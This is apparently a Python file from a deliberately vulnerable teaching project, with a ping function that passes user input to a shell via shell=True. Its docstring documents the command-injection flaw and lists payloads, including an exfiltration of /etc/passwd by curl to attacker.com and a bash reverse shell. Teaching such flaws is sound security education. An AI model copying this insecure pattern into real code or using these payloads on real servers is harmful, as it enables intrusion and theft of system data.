"""
Day 9 - 系统命令执行模块
负责执行服务器 ping 命令等网络诊断功能。
注意：本项目为教学用途，部分代码存在安全隐患。
"""

import subprocess
import os


def run_ping(ip_address):
    """
    执行 ping 命令检测主机连通性。

    ============================================================
    VULN-18: 命令注入（Command Injection）
    - ip_address 参数直接拼接到 shell 命令中
    - 使用 shell=True 或 subprocess 的 shell 模式
    - 无任何输入过滤或白名单校验
    - 命令执行结果直接返回给用户

    复现方法 - 基本绕过：
      POST /ping  ip=127.0.0.1;id
      POST /ping  ip=127.0.0.1|whoami
      POST /ping  ip=127.0.0.1`ls -la`

    复现方法 - 外带数据（无回显时）：
      POST /ping  ip=127.0.0.1;curl http://attacker.com/$(cat /etc/passwd)

    复现方法 - 反弹 Shell：
      POST /ping  ip=127.0.0.1;bash -i >& /dev/tcp/attacker/4444 0>&1
    ============================================================
    """
    import platform
    system = platform.system().lower()

    # 危险！使用 shell 模式执行命令
    # 用户的 ip 输入直接拼接到命令字符串中
    if 'windows' in system:
        cmd = f"ping -n 3 {ip_address}"
    else:
        cmd = f"ping -c 3 {ip_address}"

    try:
        # 危险！使用 shell=True 允许 shell 解析特殊字符
        result = subprocess.check_output(
            cmd,
            shell=True,  # VULN: 启用 shell 模式
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.decode('utf-8', errors='replace')
        return {"success": True, "output": output}
    except subprocess.CalledProcessError as e:
        return {"success": True, "output": e.output.decode('utf-8', errors='replace')}
    except subprocess.TimeoutExpired:
        return {"success": False, "message": "命令执行超时"}
    except Exception as e:
        return {"success": False, "message": f"执行失败: {str(e)}"}
